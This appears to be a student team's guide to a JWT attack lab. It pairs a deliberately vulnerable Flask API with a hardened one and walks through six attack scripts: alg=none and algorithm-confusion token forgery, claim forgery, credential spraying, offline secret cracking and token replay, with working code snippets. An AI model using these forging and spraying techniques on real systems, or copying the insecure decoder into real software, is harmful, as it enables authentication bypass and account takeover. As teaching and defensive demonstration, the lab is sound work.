# Code Guide — How the Code Works
## Problem #17 — JWT Attack Toolkit · TEAM-14

This document explains every file in the project: what it does, how it works,
and why it was written that way. Written for both technical and non-technical readers.

---

## Overview — How All Files Connect

```
                    ┌─────────────────────┐
                    │     dashboard.py     │  ← browser UI (port 5002)
                    │  polls /events       │
                    └────────┬────────────┘
                             │ HTTP requests
          ┌──────────────────┴──────────────────┐
          │                                      │
┌─────────▼──────────┐               ┌──────────▼──────────┐
│  vulnerable_app.py  │               │   hardened_app.py    │
│  port 5000          │               │   port 5001          │
│  accepts: all algs  │               │   accepts: RS256 only│
└─────────▲──────────┘               └──────────▲──────────┘
          │                                      │
          │ HTTP attack requests                 │
          └──────────────────┬───────────────────┘
                    ┌────────┴─────────┐
                    │  attack_*.py     │
                    │  (6 scripts)     │
                    └──────────────────┘
```

---

## vulnerable_app.py — The Target Server

**Purpose:** A Flask REST API that is deliberately misconfigured to accept all JWT algorithms.
This is the server all attacks target.

**Port:** 5000

### Key section — The vulnerable decoder

```python
def decode_vulnerable(token: str) -> dict:
    parts = token.split(".")          # split header.payload.signature
    header  = json.loads(_b64url_decode(parts[0]))
    payload = json.loads(_b64url_decode(parts[1]))
    
    alg = header.get("alg", "").upper()   # ← ROOT CAUSE: reads alg from token
    
    if alg == "NONE":
        return payload                     # Attack 1: skips all verification
    
    elif alg == "HS256":
        # Attack 2: uses PUBLIC key as HMAC secret
        expected_sig = hmac.new(PUBLIC_KEY.encode(), signing_input, hashlib.sha256)
        # if sig matches → accepts token
        return payload
    
    elif alg == "RS256":
        return jwt.decode(token, PUBLIC_KEY, algorithms=["RS256"])  # correct
```

**Why custom decoder instead of PyJWT?**
PyJWT >= 2.0 added safeguards that would block the demo.
The vulnerable pattern shown here is identical to what CVE-2015-9235 did.

### Event logging — how the dashboard gets live data

```python
_EVENTS = []        # stores last 50 events
_TOTAL_EVENTS = 0   # never resets — used by dashboard to detect changes

def _log_event(ip, alg, result, status_code, path="/admin"):
    _EVENTS.append({
        "ts": time.strftime("%H:%M:%S"),
        "ip": ip, "alg": alg, "result": result,
        "status": status_code, "path": path
    })

@app.route("/events")
def events():
    return jsonify({"total": _TOTAL_EVENTS, "events": list(reversed(_EVENTS))})
```

Every hit on `/login`, `/profile`, and `/admin` is logged here.
The dashboard polls `/events` every 2 seconds and re-renders if `total` changed.

### Endpoints summary

| Route | What it does |
|-------|-------------|
| `POST /login` | Validates username/password, returns RS256-signed JWT |
| `GET /public-key` | Returns the RSA public key — intentionally public |
| `GET /profile` | Requires valid token, returns claims |
| `GET /admin` | Requires `role=admin` in token, returns flag |
| `GET /events` | Returns live event log for dashboard |

---

## hardened_app.py — The Fixed Server

**Purpose:** Same API as vulnerable_app.py but with the one-line fix applied.
Used to show the contrast — same attack, different result.

**Port:** 5001

### The fix — one line difference

```python
# vulnerable_app.py
alg = header.get("alg")
jwt.decode(token, key, algorithms=[alg])   # trusts user input

# hardened_app.py
jwt.decode(token, PUBLIC_KEY, algorithms=["RS256"])   # pinned — cannot be changed
```

When PyJWT sees `alg=none` or `alg=HS256` and the allowed list is `["RS256"]`,
it raises `DecodeError` immediately — before reading the signature or payload.
The application code never even runs.

---

## attack_none.py — Attack 1

**Purpose:** Demonstrates the `alg=none` bypass.

**How it works:**

```python
def forge_none_token():
    header  = base64url({"alg": "none", "typ": "JWT"})
    payload = base64url({"user": "attacker", "role": "admin"})
    return f"{header}.{payload}."   # empty signature after the last dot
```

1. Builds a header with `alg=none`
2. Injects `role=admin` into the payload
3. Leaves the signature empty
4. Sends to `/admin` — server accepts it

**No crypto used.** Just base64url encoding — something any text editor can do.

---

## attack_confusion.py — Attack 2

**Purpose:** RS256 → HS256 algorithm confusion attack.

**How it works:**

```python
def forge_hs256_token(public_key_pem):
    header  = base64url({"alg": "HS256", "typ": "JWT"})
    payload = base64url({"user": "attacker", "role": "admin"})
    
    signing_input = f"{header}.{payload}".encode()
    
    # sign with HS256 using the PUBLIC KEY as the HMAC secret
    sig = hmac.new(public_key_pem.encode(), signing_input, hashlib.sha256).digest()
    
    return f"{header}.{payload}.{base64url(sig)}"
```

1. Fetches the public key from `/public-key`
2. Uses it as the HMAC secret (the trick)
3. Server verifies with the same public key — they match — accepted

**Why this works:** The server checks HS256 tokens using `hmac.new(PUBLIC_KEY, ...)`.
The attacker does the exact same computation. Both sides use the same key, same input → same output.

---

## attack_forgery.py — Attack 3

**Purpose:** Standalone claim forgery demo. Shows step-by-step what gets injected.

**How it works:**

```python
# Step 1 — alice (role=user) cannot access /admin → 403
hit_admin(alice_token, "alice real token")

# Step 2 — forge token with role=admin via alg=none
forged = forge_claims({"user": "attacker", "role": "admin"})

# Step 3 — forged token accesses /admin → 200 + flag
hit_admin(forged, "forged token")
```

Key point: shows the **before** (403 for alice) and **after** (200 for forged token)
so the privilege escalation is visually obvious.

---

## attack_spray.py — Attack 4

**Purpose:** Credential spraying against `/login`.

**How it works:**

```python
SPRAY_LIST = [
    ("admin", "admin"),
    ("admin", "password"),
    ("admin", "secret99"),   # ← correct password
    ("alice", "pass123"),    # ← correct password
    ...
]

for username, password in SPRAY_LIST:
    r = requests.post(f"{TARGET}/login", json={"username": username, "password": password})
    if r.status_code == 200:
        print(f"[HIT] {username}:{password} → token captured")
```

Tries a small set of passwords — avoids lockout by not hammering one account.
Any successful login returns a real JWT that can be used in further attacks.

---

## attack_crack.py — Attack 5

**Purpose:** Demonstrates offline JWT secret cracking for HS256 tokens.

**How it works:**

```python
def crack(token):
    header_b64, payload_b64, original_sig = token.split(".")
    signing_input = f"{header_b64}.{payload_b64}".encode()

    for candidate in WORDLIST:
        trial_sig = hmac.new(candidate.encode(), signing_input, hashlib.sha256).digest()
        if hmac.compare_digest(base64url(trial_sig), original_sig):
            return candidate   # secret found
    return None
```

1. Takes a captured HS256 token
2. For each candidate word: re-signs the same input with that word as the secret
3. If the signature matches → secret found → can forge any token

**Fully offline** — no server contact after the token is captured.
Real-world equivalent: `hashcat --hash-type 16500`

---

## attack_replay.py — Attack 6

**Purpose:** Demonstrates token replay — using the same token multiple times.

**How it works:**

```python
# Step 1 — get one legitimate token
r = requests.post(f"{TARGET}/login", json={"username": "alice", "password": "pass123"})
token = r.json()["token"]

# Step 2 — reuse it 5 times
for i in range(5):
    r = requests.get(f"{TARGET}/profile", headers={"Authorization": f"Bearer {token}"})
    print(f"Replay #{i+1}: HTTP {r.status_code}")   # 200 every time
```

Works because the token has no `exp` (expiry) or `jti` (unique ID) claim.
The server has no way to know the token is being reused.

---

## dashboard.py — Web UI

**Purpose:** Browser-based dashboard for live attack demonstration.

**Port:** 5002

### How the live feed works

```
1. attack scripts hit port 5000
          ↓
2. vulnerable_app.py logs to _EVENTS list
          ↓
3. dashboard.py polls /api/livefeed every 2 seconds
          ↓
4. /api/livefeed proxies to vulnerable_app.py/events
          ↓
5. JS in browser re-renders feed if _TOTAL_EVENTS changed
```

### Key design decisions

**Why proxy through dashboard instead of calling /events directly from browser?**
Cross-Origin Resource Sharing (CORS) — browsers block JS from calling a different port
directly. The dashboard backend acts as a proxy to avoid this.

**Why use `_TOTAL_EVENTS` instead of timestamp for change detection?**
Timestamps have second-level precision. Two attacks in the same second would have
identical timestamps, and the second event would be skipped. A monotonic counter
never has this problem.

### Attack functions

```python
def build_none_token():
    h = b64url({"alg": "none", "typ": "JWT"})
    p = b64url({"user": "attacker", "role": "admin"})
    return f"{h}.{p}."

def build_confusion_token(public_key_pem):
    h = b64url({"alg": "HS256", "typ": "JWT"})
    p = b64url({"user": "attacker", "role": "admin"})
    sig = hmac.new(public_key_pem.encode(), f"{h}.{p}".encode(), hashlib.sha256).digest()
    return f"{h}.{p}.{base64url(sig)}"
```

These replicate the same logic as the standalone attack scripts —
the dashboard can run attacks directly from the browser button.

---

## demo.py — Automated Demo Runner

**Purpose:** Runs everything end-to-end with one command for demo day.

**How it works:**

```python
# 1. Start both servers as background subprocesses
vuln_proc = subprocess.Popen([sys.executable, "vulnerable_app.py"], ...)
hard_proc = subprocess.Popen([sys.executable, "hardened_app.py"], ...)

# 2. Wait until both servers respond (poll /public-key)
_wait_for_server(VULN_URL)
_wait_for_server(HARD_URL)

# 3. Run attacks against both
run_attack_none()
run_attack_confusion()

# 4. Save output to demo_output.txt as backup
```

Using `subprocess.Popen` means the user does not need to open multiple terminals.
`demo_output.txt` acts as a backup in case the live demo breaks mid-presentation.

---

## postman_tokens.py — Token Generator

**Purpose:** Generates pre-built forged tokens for Postman demo.

Prints 4 tokens:
1. Legitimate alice token (from real login — for replay demo)
2. Legitimate admin token (for comparison)
3. Forged alg=none token (fixed — always the same, no server needed)
4. Forged HS256 token (needs server to get public key)

Run once while server is up, copy tokens, paste into Postman headers.

---

## Security Design Decisions

### Why use a custom decoder in vulnerable_app.py?

PyJWT >= 2.0 added protections that block `alg=none` and algorithm confusion.
Using PyJWT directly would make the demo fail silently.
The custom decoder reproduces the exact pattern that CVE-2015-9235 used —
making the demo historically accurate.

### Why expose `/public-key`?

This mirrors real-world JWKS endpoints. AWS Cognito, Auth0, and GCP all expose
public keys so clients can verify tokens. The vulnerability is accepting HS256,
not the key exposure. Keeping `/public-key` open makes the demo realistic.

### Why no `exp` claim on issued tokens?

Intentional — to demonstrate the token replay attack.
In production every token must have `exp`.

### Why `host="0.0.0.0"` on all servers?

Makes servers reachable on the LAN so the multi-laptop attack demo works.
Without this, servers would only accept connections from `localhost`.
